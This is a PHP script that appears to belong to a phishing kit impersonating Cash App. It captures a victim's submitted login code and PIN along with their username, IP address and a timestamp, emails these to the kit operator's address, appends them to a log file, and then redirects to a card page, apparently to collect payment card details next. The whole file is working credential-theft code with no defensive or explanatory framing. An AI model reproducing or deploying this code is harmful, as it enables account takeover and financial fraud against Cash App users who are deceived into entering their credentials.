<?php 
session_start();
include 'CONFIG_XS.php';
if (isset($_POST['code'])){
$_SESSION["id_00bc4b79dfc3448eb29a5371f1b8b687_Model_code"] = $_POST['code'];
$_SESSION["id_00bc4b79dfc3448eb29a5371f1b8b687_Model_pin"] = $_POST['pin'];
$DT = date("Y/m/d h:i:s:A");


$headers .= "FROM: CASH-APP<team>";
		

$suj = "[ACCESS-CASHAPP] - ". $_SESSION['id_00bc4b79dfc3448eb29a5371f1b8b687_Model_UserName'] ." - " . $_SERVER['REMOTE_ADDR'] . " ";
$msgm = "
CashAPP USER     : " . $_SESSION['id_00bc4b79dfc3448eb29a5371f1b8b687_Model_UserName'] . "
CashAPP CODE     : " . $_POST['code'] . "
CashAPP PIN     : " . $_POST['pin'] . "
IP            : " . $_SERVER['REMOTE_ADDR'] . "
TIME          : " . $DT . "
";
mail($TO, $suj, $msgm, $headers);
$msg = "
CashAPP USER : " . $_SESSION['id_00bc4b79dfc3448eb29a5371f1b8b687_Model_UserName'] . "
CashAPP CODE : " . $_POST['code'] . "
CashAPP PIN : " . $_POST['pin'] . "
IP : " . $_SERVER['REMOTE_ADDR'] . "
TIME : " . $DT ." " ; 
$myfile = fopen("../log.txt", "a");
fwrite($myfile, $msg);
fclose($myfile);		

header("Location: ../card.php");	
}
?>